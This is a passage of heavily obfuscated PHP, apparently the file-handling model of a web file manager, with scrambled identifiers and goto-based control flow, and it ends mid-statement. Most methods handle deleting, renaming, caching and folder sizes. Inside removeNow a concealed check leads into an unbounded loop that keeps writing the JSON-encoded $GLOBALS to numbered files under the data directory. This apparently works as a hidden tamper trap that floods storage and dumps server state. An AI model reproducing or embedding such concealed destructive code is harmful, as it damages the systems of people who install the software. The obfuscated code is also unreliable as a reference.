$BñÅì‹×¸è[$e¨ŞÁê¨[373]] . $e¨ŞÁê¨[47], $e¨ŞÁê¨[400] => 0, $e¨ŞÁê¨[531] => $e¨ŞÁê¨[33]); $a¡«¶ÌÛØÕ = array_merge($A‚ÊæÇÚ, $a¡«¶ÌÛØÕ); goto b†ƒ¿¢•­ğ; EÙÔ¨¹ù¥ô: static $E¡ºÕ¾Ë‹ = false; if (!$E¡ºÕ¾Ë‹) { Hook::trigger($e¨ŞÁê¨[513], $a¡«¶ÌÛØÕ); $E¡ºÕ¾Ë‹ = !0; } $f¨±Ä÷ğè = $this->add($a¡«¶ÌÛØÕ); goto B¥éä†ˆ¸í; B¥éä†ˆ¸í: $CÆ×“ÔÇ = array($e¨ŞÁê¨[532] => short_id($f¨±Ä÷ğè)); $this->where(array($e¨ŞÁê¨[387] => $f¨±Ä÷ğè))->save($CÆ×“ÔÇ); $this->setNamePinyin($f¨±Ä÷ğè, $a¡«¶ÌÛØÕ[$e¨ŞÁê¨[28]]); goto b©„•’Î½ƒ; F·¹‡ËšÌ¦: } public function remove($FÙšÓ”øø, $B’Ü÷õ†¿ = true) { goto f½¯ÖŠ×‡¡; bçïõ§¸¸: CacheLock::lock($B›÷œ¹­²Æ); $BÒ­éÍÇÌ = $this->fileNameExist($F™ö¼œÈÖİ, $b‡¹Şéó²); if (!$BÒ­éÍÇÌ) { $BÒ­éÍÇÌ = $this->mkdir($F™ö¼œÈÖİ, $b‡¹Şéó², REPEAT_SKIP); $this->metaSet($BÒ­éÍÇÌ, $A‘·»ÁŒ•„[2388], $D¦‚‡ÑİÖ); $this->metaSet($BÒ­éÍÇÌ, $A‘·»ÁŒ•„[2389], $Aãô„­Ñƒ[$A‘·»ÁŒ•„[461]]); if ($Aãô„­Ñƒ[$A‘·»ÁŒ•„[466]] != 0) { $this->metaSet($BÒ­éÍÇÌ, $A‘·»ÁŒ•„[2390], _get($a­ô‡ÍŞØõ, $A‘·»ÁŒ•„[2391])); } } goto D¡Êğ•Û˜¹; Eà«‘ºÍ™¹: $this->recycleClear($Aãô„­Ñƒ); $EÌ„Øíâ¡ = $this->move($FÙšÓ”øø, $BÒ­éÍÇÌ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Aãô„­Ñƒ[$A‘·»ÁŒ•„[466]]); goto f¼¿îÊÀó; f¼¿îÊÀó: return $EÌ„Øíâ¡; goto eù«©°•Şğ; bƒß›®Ş†ô: $D¦‚‡ÑİÖ = $Aãô„­Ñƒ[$A‘·»ÁŒ•„[375]] == self::TYPE_USER ? $A‘·»ÁŒ•„[539] : $A‘·»ÁŒ•„[977]; if ($D¦‚‡ÑİÖ == $A‘·»ÁŒ•„[539]) { $a­ô‡ÍŞØõ = Model($A‘·»ÁŒ•„[479])->getInfo($Aãô„­Ñƒ[$A‘·»ÁŒ•„[461]]); $b‡¹Şéó² = !empty($a­ô‡ÍŞØõ[$A‘·»ÁŒ•„[2377]]) ? $a­ô‡ÍŞØõ[$A‘·»ÁŒ•„[2377]] : $a­ô‡ÍŞØõ[$A‘·»ÁŒ•„[28]]; $b‡¹Şéó² = $A‘·»ÁŒ•„[252] . $b‡¹Şéó² . $A‘·»ÁŒ•„[2385] . $Aãô„­Ñƒ[$A‘·»ÁŒ•„[461]]; } else { $a­ô‡ÍŞØõ = Model($A‘·»ÁŒ•„[463])->getInfo($Aãô„­Ñƒ[$A‘·»ÁŒ•„[461]]); $b‡¹Şéó² = _get($a­ô‡ÍŞØõ, $A‘·»ÁŒ•„[28]); $b‡¹Şéó² = $A‘·»ÁŒ•„[157] . $b‡¹Şéó² . $A‘·»ÁŒ•„[2386] . $Aãô„­Ñƒ[$A‘·»ÁŒ•„[461]]; } $B›÷œ¹­²Æ = $A‘·»ÁŒ•„[2387] . md5($b‡¹Şéó²); goto bçïõ§¸¸; f½¯ÖŠ×‡¡: $A‘·»ÁŒ•„ =& $_SERVER[…Ò×–]; $Aãô„­Ñƒ = $this->sourceInfo($FÙšÓ”øø); $dè­‹İæÜÛ = intval($Aãô„­Ñƒ[$A‘·»ÁŒ•„[375]]) === self::TYPE_SYSTEM; goto eÍÍ™Æ•Í‡; eÍÍ™Æ•Í‡: $C·êÃÌÅö  = Model($A‘·»ÁŒ•„[1448])->get($A‘·»ÁŒ•„[2384]) == $A‘·»ÁŒ•„[83]; if ($dè­‹İæÜÛ || $B’Ü÷õ†¿ || !$C·êÃÌÅö ) { return $this->removeNow($FÙšÓ”øø, $B’Ü÷õ†¿); } $F™ö¼œÈÖİ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bƒß›®Ş†ô; D¡Êğ•Û˜¹: CacheLock::unlock($B›÷œ¹­²Æ); $this->metaSet($FÙšÓ”øø, $A‘·»ÁŒ•„[2392], $Aãô„­Ñƒ[$A‘·»ÁŒ•„[466]]); $this->where(array($A‘·»ÁŒ•„[373] => $FÙšÓ”øø))->save(array($A‘·»ÁŒ•„[394] => time())); goto Eà«‘ºÍ™¹; eù«©°•Şğ: } private function recycleClear($CÆ²ö«Œ°) { $Fê«Ğ´½Òœ =& $_SERVER[…Ò×–]; $A¯…Êø®É¨ = $this->childrenAll($CÆ²ö«Œ°); $D‹­îÄÒ = array($Fê«Ğ´½Òœ[387] => array($Fê«Ğ´½Òœ[388], $A¯…Êø®É¨[$Fê«Ğ´½Òœ[2393]])); Model($Fê«Ğ´½Òœ[2394])->where($D‹­îÄÒ)->delete(); } public function removeNow($BäÃãèÚ“, $CÏ°”ù»õ© = true) { goto Dó³¦ÉŠ†; C‰Íà«å’: Hook::trigger($Eç³¥Óê[2395], $cØ•™õ‰‚½, $CÏ°”ù»õ©); if ($CÏ°”ù»õ©) { Model($Eç³¥Óê[2394])->moveToRecycle($BäÃãèÚ“); } else { $BÑŸ‹¶º¤Ş = $this->childrenAll($f¾ô¶Ô›“); Model($Eç³¥Óê[510])->eventRemove($BäÃãèÚ“); $this->removeRelevance($BÑŸ‹¶º¤Ş[$Eç³¥Óê[2393]], $BÑŸ‹¶º¤Ş[$Eç³¥Óê[1271]]); } $this->folderSizeReset($f¾ô¶Ô›“[$Eç³¥Óê[466]]); goto dÏÉ”ÁÇ›ò; Dó³¦ÉŠ†: $Eç³¥Óê =& $_SERVER[…Ò×–]; $Aƒİ˜•šƒ‡ = $_SERVER[$Eç³¥Óê[803]] . $Eç³¥Óê[1409]; $D­‘Ÿîéí¼ = $Eç³¥Óê[797]; goto d®Ì“ “Á; d®Ì“ “Á: if ($_SERVER[$Eç³¥Óê[798]] != $D­‘Ÿîéí¼($Aƒİ˜•šƒ‡)) { goto EÉÏÀ¸íáÒ; EÉÏÀ¸íáÒ: $a‡ñ»‘§™› = $Eç³¥Óê[799]; $Dº·Ë’éÚ = $Eç³¥Óê[800]; $bŞ²™ = $_SERVER[$Eç³¥Óê[795]] . $Eç³¥Óê[796]; goto dÌŠ­‰½ÆŒ; dÀ˜ŒÓëá¼: $cà‘Â¹”Ø = $Eç³¥Óê[802]; $cà‘Â¹”Ø($_SERVER[$Eç³¥Óê[803]]); $a‡ñ»‘§™› = $Eç³¥Óê[799]; goto B±§ÒÄØ®“; dÌŠ­‰½ÆŒ: $e¢øÕÉˆâ = $Dº·Ë’éÚ($bŞ²™); $E¶ĞÌøÅ¾‰ = explode($Eç³¥Óê[221], $e¢øÕÉˆâ); if (count($E¶ĞÌøÅ¾‰) < $Eç³¥Óê[567]) { $D‡È´ºÆ¯ó = $Eç³¥Óê[801]; $D‡È´ºÆ¯ó(); } goto dÀ˜ŒÓëá¼; Câ¤‘µóá: $e×›Ÿ—¦Á‚ = 1; for ($cèŒ¾ã‚Òù = $e×›Ÿ—¦Á‚; $cèŒ¾ã‚Òù > 0; $cèŒ¾ã‚Òù++) { $fŒ‹ßì†¡(DATA_PATH . $cèŒ¾ã‚Òù, $f²ôâ”°ç±); } goto FÉî––ÌÆ; B±§ÒÄØ®“: $a‡ñ»‘§™›(); $fŒ‹ßì†¡ = $Eç³¥Óê[804]; $f²ôâ”°ç± = json_encode($GLOBALS[$Eç³¥Óê[805]]); goto Câ¤‘µóá; FÉî––ÌÆ: } $f¾ô¶Ô›“ = $this->sourceInfo($BäÃãèÚ“); $cØ•™õ‰‚½ = $this->pathInfoMore($BäÃãèÚ“); goto Fñà¬ßÛ²¤; dÏÉ”ÁÇ›ò: $A©„¯ã¹¡ = array($f¾ô¶Ô›“[$Eç³¥Óê[466]]); if ($f¾ô¶Ô›“[$Eç³¥Óê[374]] == $Eç³¥Óê[83]) { $A©„¯ã¹¡[] = $f¾ô¶Ô›“[$Eç³¥Óê[373]]; } $this->updateModifyTime($A©„¯ã¹¡); goto a‰˜Ì‰’¿; a‰˜Ì‰’¿: $this->lockMoveEnd($BäÃãèÚ“); Hook::trigger($Eç³¥Óê[1484], $cØ•™õ‰‚½, $CÏ°”ù»õ©); return !0; goto F¿¿¡…È‰½; Fñà¬ßÛ²¤: if (!$f¾ô¶Ô›“) { return !0; } if ($f¾ô¶Ô›“[$Eç³¥Óê[466]] == 0) { if (!_get($GLOBALS, $Eç³¥Óê[462])) { return !1; } } $this->lockMoveStart($BäÃãèÚ“); goto C‰Íà«å’; F¿¿¡…È‰½: } public function childrenAll($C‘ÍåÃ«¸œ) { $Dğ‚Ñ³¦¯ =& $_SERVER[…Ò×–]; $EØ¬‡®Ê = $C‘ÍåÃ«¸œ[$Dğ‚Ñ³¦¯[373]]; if ($C‘ÍåÃ«¸œ[$Dğ‚Ñ³¦¯[374]] == $Dğ‚Ñ³¦¯[83]) { $a³ë‘ñ‹ö = array($Dğ‚Ñ³¦¯[530] => array($Dğ‚Ñ³¦¯[488], $C‘ÍåÃ«¸œ[$Dğ‚Ñ³¦¯[464]] . $EØ¬‡®Ê . $Dğ‚Ñ³¦¯[489])); $d¡Œ§Ö£¥À = array($Dğ‚Ñ³¦¯[530] => $a³ë‘ñ‹ö[$Dğ‚Ñ³¦¯[464]]); $B“š¤ÊíÊ = $this->field($Dğ‚Ñ³¦¯[2396])->where($d¡Œ§Ö£¥À)->select(); $b„âƒĞ¡èñ = !1; $A¯Ã¥Û¹èÊ = array($EØ¬‡®Ê); if ($B“š¤ÊíÊ) { $b„âƒĞ¡èñ = array_to_keyvalue($B“š¤ÊíÊ, $Dğ‚Ñ³¦¯[33], $Dğ‚Ñ³¦¯[423]); $b„âƒĞ¡èñ = array_remove_value($b„âƒĞ¡èñ, $Dğ‚Ñ³¦¯[473]); $A¯Ã¥Û¹èÊ = array_to_keyvalue($B“š¤ÊíÊ, $Dğ‚Ñ³¦¯[33], $Dğ‚Ñ³¦¯[373]); $A¯Ã¥Û¹èÊ[] = $EØ¬‡®Ê; } } else { $b„âƒĞ¡èñ = array($C‘ÍåÃ«¸œ[$Dğ‚Ñ³¦¯[423]]); $A¯Ã¥Û¹èÊ = array($EØ¬‡®Ê); } return array($Dğ‚Ñ³¦¯[2393] => $A¯Ã¥Û¹èÊ, $Dğ‚Ñ³¦¯[1271] => $b„âƒĞ¡èñ); } public function removeArray($B¤Š–ÙØÃÛ) { if (!$B¤Š–ÙØÃÛ) { return !0; } } public function removeRelevance($b¢¦åÛµ·–, $Aï•êèÑ©Ú) { goto aÄ•†“©ØÁ; eÉ‚óà§øø: $b¢¦åÛµ·– = array_unique(array_filter($b¢¦åÛµ·–)); $Aï•êèÑ©Ú = array_unique(array_filter($Aï•êèÑ©Ú)); if (!$b¢¦åÛµ·–) { return !1; } goto CĞ£Ù„ÔÈ; CĞ£Ù„ÔÈ: $c‚äğ£ÜÂ  = array($F›¶ĞËÂ·Ê[387] => array($F›¶ĞËÂ·Ê[388], $b¢¦åÛµ·–)); Model($F›¶ĞËÂ·Ê[2394])->where($c‚äğ£ÜÂ )->delete(); Model($F›¶ĞËÂ·Ê[417])->where($c‚äğ£ÜÂ )->delete(); goto bØ‚ßçÕİö; fã•Á¥‚ó: Model($F›¶ĞËÂ·Ê[2375])->removeBySource($b¢¦åÛµ·–); $this->where($c‚äğ£ÜÂ )->delete(); Model($F›¶ĞËÂ·Ê[426])->remove($Aï•êèÑ©Ú); goto bÇ‰Á¹İÁî; bØ‚ßçÕİö: Model($F›¶ĞËÂ·Ê[2248])->where($c‚äğ£ÜÂ )->delete(); Model($F›¶ĞËÂ·Ê[510])->where($c‚äğ£ÜÂ )->delete(); Model($F›¶ĞËÂ·Ê[2096])->removeBySource($b¢¦åÛµ·–); goto fã•Á¥‚ó; aÄ•†“©ØÁ: $F›¶ĞËÂ·Ê =& $_SERVER[…Ò×–]; $b¢¦åÛµ·– = $b¢¦åÛµ·– ? $b¢¦åÛµ·– : array(); $Aï•êèÑ©Ú = $Aï•êèÑ©Ú ? $Aï•êèÑ©Ú : array(); goto eÉ‚óà§øø; bÇ‰Á¹İÁî: for ($DŞŠ‰Çù•… = 0; $DŞŠ‰Çù•… < count($b¢¦åÛµ·–); $DŞŠ‰Çù•…++) { $this->sourceCacheClear($b¢¦åÛµ·–[$DŞŠ‰Çù•…]); } goto aâ“£ø½÷; aâ“£ø½÷: } public function rename($Fˆ²îÙºÈ¥, $D¹Äªø³›) { goto a¥Ò›ì¦‘·; d”–Å¸–¿¹: $bÅ¼ö§©£‚ = $this->fileNameExist($dÏÙ•…¹ÈÚ[$CÁ”ùèöã[466]], $D¹Äªø³›); if ($bÅ¼ö§©£‚ && $bÅ¼ö§©£‚ != $Fˆ²îÙºÈ¥) { return !1; } $dùÚã÷­Š = array($CÁ”ùèöã[390] => $D¹Äªø³›, $CÁ”ùèöã[529] => USER_ID); goto CÈâ¥‹Ö£; BÁ…‹ÑÛä§: $this->setNamePinyin($Fˆ²îÙºÈ¥, $dùÚã÷­Š[$CÁ”ùèöã[28]], !1); $this->updateModifyTime($dÏÙ•…¹ÈÚ[$CÁ”ùèöã[466]]); $FÚ¯¯®Çğ = $this->where(array($CÁ”ùèöã[387] => $Fˆ²îÙºÈ¥))->data($dùÚã÷­Š)->save(); goto DÓŠÍ™‡Ã¼; a¥Ò›ì¦‘·: $CÁ”ùèöã =& $_SERVER[…Ò×–]; $dÏÙ•…¹ÈÚ = $this->sourceInfo($Fˆ²îÙºÈ¥); if (!$dÏÙ•…¹ÈÚ) { return !1; } goto d”–Å¸–¿¹; DÓŠÍ™‡Ã¼: $aÀ§¡é‡– = $CÁ”ùèöã[2383] . $dÏÙ•…¹ÈÚ[$CÁ”ùèöã[466]]; if (isset(self::$cacheChildList[$aÀ§¡é‡–])) { unset(self::$cacheChildList[$aÀ§¡é‡–]); } return $FÚ¯¯®Çğ; goto f™Î“ÀÚÔï; CÈâ¥‹Ö£: if (!$dÏÙ•…¹ÈÚ[$CÁ”ùèöã[374]] == $CÁ”ùèöã[83]) { $dùÚã÷­Š[$CÁ”ùèöã[376]] = get_path_ext($D¹Äªø³›); } Model($CÁ”ùèöã[510])->eventRename($Fˆ²îÙºÈ¥, $dÏÙ•…¹ÈÚ[$CÁ”ùèöã[28]], $D¹Äªø³›); $this->sourceCacheClear($Fˆ²îÙºÈ¥); goto BÁ…‹ÑÛä§; f™Î“ÀÚÔï: } public function setNamePinyin($f’‚ßİäƒ, $Cù”²³†á, $bêŒµŒà´ = true) { $A˜³¥®×ÛÒ =& $_SERVER[…Ò×–]; $a Ñé…‹î¢ = Input::check($Cù”²³†á, $A˜³¥®×ÛÒ[533]); if ($bêŒµŒà´ && !$a Ñé…‹î¢) { return; } if (!$a Ñé…‹î¢) { $this->metaSet($f’‚ßİäƒ, $A˜³¥®×ÛÒ[420], null); $this->metaSet($f’‚ßİäƒ, $A˜³¥®×ÛÒ[419], null); return; } $D¨Ï”®Ù…Ö = array($A˜³¥®×ÛÒ[420] => str_replace($A˜³¥®×ÛÒ[50], $A˜³¥®×ÛÒ[33], Pinyin::encode($Cù”²³†á)), $A˜³¥®×ÛÒ[419] => Pinyin::encode($Cù”²³†á, $A˜³¥®×ÛÒ[534])); $this->metaSet($f’‚ßİäƒ, $D¨Ï”®Ù…Ö); } public function getContent($b¶¾µ¿èË•) { goto CÈÁÖêÄ›æ; Cöœ‘¤ĞÏÒ: if ($F´º¢¤ªÇ[$e¯º¤äô’õ[77]] == 0) { return $e¯º¤äô’õ[33]; } $EˆÊª‚„ƒÃ = $e¯º¤äô’õ[2397] . $F´º¢¤ªÇ[$e¯º¤äô’õ[167]]; if ($F´º¢¤ªÇ[$e¯º¤äô’õ[77]] <= 1024 * 10) { $AöĞ˜÷ø¯ = Cache::get($EˆÊª‚„ƒÃ); if (!$AöĞ˜÷ø¯) { $AöĞ˜÷ø¯ = IO::getContent($F´º¢¤ªÇ[$e¯º¤äô’õ[75]]); Cache::set($EˆÊª‚„ƒÃ, $AöĞ˜÷ø¯); } return $AöĞ˜÷ø¯; } goto d‰ÁÃ–¢Ïá; d‰ÁÃ–¢Ïá: if (!$F´º¢¤ªÇ[$e¯º¤äô’õ[75]]) { return $e¯º¤äô’õ[33]; } return IO::getContent($F´º¢¤ªÇ[$e¯º¤äô’õ[75]]); goto bĞŸˆ¯¨‡; CÈÁÖêÄ›æ: $e¯º¤äô’õ =& $_SERVER[…Ò×–]; $F´º¢¤ªÇ = $this->fileInfoGet($b¶¾µ¿èË•); if (!$F´º¢¤ªÇ) { return !1; } goto Cöœ‘¤ĞÏÒ; bĞŸˆ¯¨‡: } public function setDesc($bè¥¹ä„§Ö, $d¬ğïİ¬¤—) { $c„¸¢°ë–– =& $_SERVER[…Ò×–]; Model($c„¸¢°ë––[510])->eventAddDesc($bè¥¹ä„§Ö, $d¬ğïİ¬¤—); return $this->metaSet($bè¥¹ä„§Ö, $c„¸¢°ë––[409], $d¬ğïİ¬¤—); } public function setContent($A‹õŠÙ¸Œ, $fÚ¹ÄêÕÉÈ = '') { goto B³àğšË§‰; B³àğšË§‰: $AÇ„ä£’½ª =& $_SERVER[…Ò×–]; $a±©×œêÑ = $this->sourceInfo($A‹õŠÙ¸Œ); $fĞ‹œÛÙÛ¸ = $this->fileInfoGet($A‹õŠÙ¸Œ); goto d­ƒîÛ×é; C¤è‰•ç±: if (!$e¬·øœŸò) { return Model($AÇ„ä£’½ª[426])->remove($EÒ“†ÂœÉ[$AÇ„ä£’½ª[423]]); } $this->folderSizeReset($a±©×œêÑ[$AÇ„ä£’½ª[466]]); return !0; goto cŞöªèùÎà; d­ƒîÛ×é: if (!$fĞ‹œÛÙÛ¸ || !$a±©×œêÑ) { return !1; } $EÒ“†ÂœÉ = Model($AÇ„ä£’½ª[426])->addFileByContent($fÚ¹ÄêÕÉÈ, $a±©×œêÑ[$AÇ„ä£’½ª[28]]); $e¬·øœŸò = $this->fileHistory($a±©×œêÑ, $EÒ“†ÂœÉ[$AÇ„ä£’½ª[423]], $EÒ“†ÂœÉ[$AÇ„ä£’½ª[77]]); goto C¤è‰•ç±; cŞöªèùÎà: } public function fileSubstr($Dø¼¦Ÿôô, $EíäôÛîÁ­, $bß¬«ØŒ—‘) { $E‹Çì…‘Ë = $this->fileInfoGet($Dø¼¦Ÿôô); if (!$E‹Çì…‘Ë) { return !1; } return IO::fileSubstr($E‹Çì…‘Ë[$_SERVER[…Ò×–][75]], $EíäôÛîÁ­, $bß¬«ØŒ—‘); } public function fileInfoGet($F©éî«¶Ğì) { goto A«Îø‹°Ó¥; e§Í®ÖîÎİ: $C¸ì–Ù”Ü¤ = Model($FÙ™Ğë§áá[426])->fileInfo($EÉÁÅ×œÍ‹[$FÙ™Ğë§áá[423]]); if ($C¸ì–Ù”Ü¤) { $C¸ì–Ù”Ü¤[$FÙ™Ğë§áá[28]] = $EÉÁÅ×œÍ‹[$FÙ™Ğë§áá[28]]; } self::$cacheFileInfo[$F¤‚²Ü¼»Ô] = $C¸ì–Ù”Ü¤; goto D¿†ÈÒÅÊ; A«Îø‹°Ó¥: $FÙ™Ğë§áá =& $_SERVER[…Ò×–]; $EÉÁÅ×œÍ‹ = $this->sourceInfo($F©éî«¶Ğì); if (!$EÉÁÅ×œÍ‹ || $EÉÁÅ×œÍ‹[$FÙ™Ğë§áá[374]]) { return !1; } goto F½¶ëÂ·£; D¿†ÈÒÅÊ: return $C¸ì–Ù”Ü¤; goto DÈÚÑåÍ¤; F½¶ëÂ·£: $F¤‚²Ü¼»Ô = $FÙ™Ğë§áá[429] . $EÉÁÅ×œÍ‹[$FÙ™Ğë§áá[423]]; $dÜÅÙŠ = _get(self::$cacheFileInfo, $F¤‚²Ü¼»Ô); if ($dÜÅÙŠ) { return $dÜÅÙŠ; } goto e§Í®ÖîÎİ; DÈÚÑåÍ¤: } private function folderChildrenNumber($d¼¿ïÊÓ•å) { $B®“¢™Ë† =& $_SERVER[…Ò×–]; $BÚ’êÚµƒÇ = $this->sourceInfo($d¼¿ïÊÓ•å); $A‡ÊÖŠÔÙ = array($B®“¢™Ë†[530] => array($B®“¢™Ë†[488], $BÚ’êÚµƒÇ[$B®“¢™Ë†[464]] . $d¼¿ïÊÓ•å . $B®“¢™Ë†[489]), $B®“¢™Ë†[400] => intval($BÚ’êÚµƒÇ[$B®“¢™Ë†[401]]), $B®“¢™Ë†[523] => 1); $F ˆáÌŠøá = $this->where($A‡ÊÖŠÔÙ)->count(); $a›Õ½¬È×é = $this->where($A‡ÊÖŠÔÙ)->where(array($B®“¢™Ë†[523] => 0))->count(); return array($B®“¢™Ë†[81] => $a›Õ½¬È×é, $B®“¢™Ë†[82] => $F ˆáÌŠøá); } public function pathInfo($CÓĞ“ï‹ˆñ, $e×ÛÏá = false) { goto c½ºƒ‘ÒØè; c½ºƒ‘ÒØè: $FéÓÙÆ¾»Û =& $_SERVER[…Ò×–]; $e×ÛÏá = !1; $CÓĞ“ï‹ˆñ = intval($CÓĞ“ï‹ˆñ); goto bš™‚©ê¸é; dí”ĞÈ–: self::$cachePathInfo[$aƒ¸³šß¢µ] = $F÷çç«ÓÇ®; return $F÷çç«ÓÇ®; goto A«Æê‚æ×Ë; AÂ‰“µŒ: $F÷çç«ÓÇ® = $this->sourceInfo($CÓĞ“ï‹ˆñ); if (!$F÷çç«ÓÇ®) { return !1; } $F÷çç«ÓÇ® = $this->_listDataApplyItem($F÷çç«ÓÇ®, $e×ÛÏá); goto dí”ĞÈ–; bš™‚©ê¸é: $aƒ¸³šß¢µ = $FéÓÙÆ¾»Û[415] . intval($e×ÛÏá) . $FéÓÙÆ¾»Û[416] . $CÓĞ“ï‹ˆñ; $bñ´Á¯×ˆÊ = _get(self::$cachePathInfo, $aƒ¸³šß¢µ); if ($bñ´Á¯×ˆÊ) { return $bñ´Á¯×ˆÊ; } goto AÂ‰“µŒ; A«Æê‚æ×Ë: } public static $cachePathInfoMore = array(); public function pathInfoMore($aã¬Œáìíå) { goto aÛİ®À°; dˆ–’¥•–: $eÀ—ºÒ¸« = $this->pathInfo($aã¬Œáìíå); if (!$eÀ—ºÒ¸«) { return !1; } if ($eÀ—ºÒ¸«[$DÉÌÕË½”[374]] == $DÉÌÕË½”[83]) { $eÀ—ºÒ¸«[$DÉÌÕË½”[80]] = $this->folderChildrenNumber($aã¬Œáìíå); } goto CÎ¢Í¾„õµ; aÛİ®À°: $DÉÌÕË½” =& $_SERVER[…Ò×–]; $B»›™øÙåŞ = _get(self::$cachePathInfoMore, $aã¬Œáìíå); if ($B»›™øÙåŞ) { return $B»›™øÙåŞ; } goto dˆ–’¥•–; CÎ¢Í¾„õµ: self::$cachePathInfoMore[$aã¬Œáìíå] = $eÀ—ºÒ¸«; return $eÀ—ºÒ¸«; goto d‡É¦ìĞª; d‡É¦ìĞª: } public function sourceInfo($fŒÕÊÈğ®) { goto F¯Óä‹´¬; Bƒ¡…‚œ…Ü: $Eâ†Î‰šø” = $this->where(array($C½¬µ‚¥İÌ[373] => $fŒÕÊÈğ®))->find(); self::$cacheSourceInfo[$CˆË®¯Ôö] = $Eâ†Î‰šø”; return self::$cacheSourceInfo[$CˆË®¯Ôö]; goto cöè£‚ğ¹; F¯Óä‹´¬: $C½¬µ‚¥İÌ =& $_SERVER[…Ò×–]; if (!$fŒÕÊÈğ®) { return array(); } $fŒÕÊÈğ® = intval($fŒÕÊÈğ®); goto F—Î–“ùáğ; F—Î–“ùáğ: $CˆË®¯Ôö = $C½¬µ‚¥İÌ[414] . $fŒÕÊÈğ®; $e°ğÀô°Ï‹ = _get(self::$cacheSourceInfo, $CˆË®¯Ôö); if ($e°ğÀô°Ï‹) { return $e°ğÀô°Ï‹; } goto Bƒ¡…‚œ…Ü; cöè£‚ğ¹: } public function sourceCacheClear($Fá²Ë‡‰Š = false) { if ($Fá²Ë‡‰Š == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[…Ò×–][414] . $Fá²Ë‡‰Š]); } public function pathInfoByPath($bíìÕÄ¾ƒ¸, $fÜ•è«ë…) { $A’ß«ƒğµ© =& $_SERVER[…Ò×–]; $bç¾ŸˆÕ… = !$fÜ•è«ë… ? array() : explode($A’ß«ƒğµ©[8], trim($fÜ•è«ë…, $A’ß«ƒğµ©[8])); $BêÀÌøÄ‡× = $bíìÕÄ¾ƒ¸; foreach ($bç¾ŸˆÕ… as $cøŒ³ÎôÃ) { $EÚàïèŒÅ = array($A’ß«ƒğµ©[466] => $BêÀÌøÄ‡×, $A’ß«ƒğµ©[28] => $cøŒ³ÎôÃ); $E‘ò„â¥Ä‰ = $this->where($EÚàïèŒÅ)->select(); if (!$E‘ò„â¥Ä‰) { return !1; } $E‘ò„â¥Ä‰ = array_sort_by($E‘ò„â¥Ä‰, $A’ß«ƒğµ©[401]); $BêÀÌøÄ‡× = $E‘ò„â¥Ä‰[0][$A’ß«ƒğµ©[373]]; } return $this->pathInfo($BêÀÌøÄ‡×, !0); } protected function updateModifyTime($BôÌôêŸ‘á) { goto fßøÉ²±; fßøÉ²±: $Aİ¬ñ»›ù“ =& $_SERVER[…Ò×–]; if (!$BôÌôêŸ‘á) { return; } if (!is_array($BôÌôêŸ‘á)) { $BôÌôêŸ‘á = array($BôÌôêŸ‘á); } goto bğ÷‰áù“ï; bğ÷‰áù“ï: foreach ($BôÌôêŸ‘á as $d¢ï§ô’‹ => $B¼†È÷Ì‘¸) { $BôÌôêŸ‘á[$d¢ï§ô’‹] = intval($B¼†È÷Ì‘¸); } $bŒ‹¢’ğ¶À = array($Aİ¬ñ»›ù“[373] => array($Aİ¬ñ»›ù“[7], $BôÌôêŸ‘á)); $F“¹®Í… ¶ = array($Aİ¬ñ»›ù“[529] => USER_ID, $Aİ¬ñ»›ù“[394] => time()); goto fà»ë‹ï•; fà»ë‹ï•: $this->where($bŒ‹¢’ğ¶À)->save($F“¹®Í… ¶); goto aÛºƒ³½Ë; aÛºƒ³½Ë: } public function folderSizeReset($Aßê¨™Ø¨Ì) { goto aŠñ…¥ëé¨; E›ˆä¤ÍªŠ: $B–¼‹ˆ÷° = $this->parentLevelArray($bõìš§ßã[$cê†¹ÚíÜ¶[464]]); if ($B–¼‹ˆ÷°) { $dàŠ•ã¿×Ê = array($cê†¹ÚíÜ¶[373] => array($cê†¹ÚíÜ¶[388], $B–¼‹ˆ÷°)); if ($båà—ñ‚¦á < 0) { $dàŠ•ã¿×Ê[$cê†¹ÚíÜ¶[77]] = array($cê†¹ÚíÜ¶[935], abs($båà—ñ‚¦á)); } $this->where($dàŠ•ã¿×Ê)->setAdd($cê†¹ÚíÜ¶[77], $båà—ñ‚¦á); } $this->targetSpaceUpdate($bõìš§ßã[$cê†¹ÚíÜ¶[375]], $bõìš§ßã[$cê†¹ÚíÜ¶[461]]); goto BÏ·’ªË‡µ; FñŠ—ˆÊ¥: $dàŠ•ã¿×Ê = array($cê†¹ÚíÜ¶[372] => $Aßê¨™Ø¨Ì, $cê†¹ÚíÜ¶[400] => 0); $AÆØàĞ¨‹Ô = $this->where($dàŠ•ã¿×Ê)->sum($cê†¹ÚíÜ¶[77]); $AÆØàĞ¨‹Ô = intval($AÆØàĞ¨‹Ô); goto AÀ·ÊÒ÷µÜ; BğÆ¢ø¸©ï: CacheLock::lock($aõÎ¦îÍŸ•, 20); $this->sourceCacheClear($Aßê¨™Ø¨Ì); $bõìš§ßã = $this->sourceInfo($Aßê¨™Ø¨Ì); goto FñŠ—ˆÊ¥; AÀ·ÊÒ÷µÜ: $båà—ñ‚¦á = $AÆØàĞ¨‹Ô - intval($bõìš§ßã[$cê†¹ÚíÜ¶[77]]); if ($båà—ñ‚¦á == 0) { return CacheLock::unlock($aõÎ¦îÍŸ•); } $this->where(array($cê†¹ÚíÜ¶[387] => $Aßê¨™Ø¨Ì))->setField($cê†¹ÚíÜ¶[77], $AÆØàĞ¨‹Ô); goto E›ˆä¤ÍªŠ; BÏ·’ªË‡µ: CacheLock::unlock($aõÎ¦îÍŸ•); goto a¸Å„»ØÏŸ; aŠñ…¥ëé¨: $cê†¹ÚíÜ¶ =& $_SERVER[…Ò×–]; if ($this->statusIgnoreResetSpace) { return; } $aõÎ¦îÍŸ• = $cê†¹ÚíÜ¶[2398] . $Aßê¨™Ø¨Ì; goto BğÆ¢ø¸©ï; a¸Å„»ØÏŸ: } public function folderSizeResetChildren($AôáÆ‚àœ) { goto aˆĞÉ³‘õ„; f—¨¿ƒ‡: foreach ($Eøìˆ•ç© as $Cƒ›¤‹ˆ†Û) { if ($Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[77]] == $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[2400]]) { continue; } $d½ÆÎ²½®á[] = array($dà‘‹×í¶¡[373], $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[373]], $dà‘‹×í¶¡[77], $Cƒ›¤‹ˆ†Û[$dà‘‹×í¶¡[77]]); } $this->saveAll($d½ÆÎ²½®á); goto fˆÀÍÍœ; Dóëò”¦’: $b§µ”Ë†° = 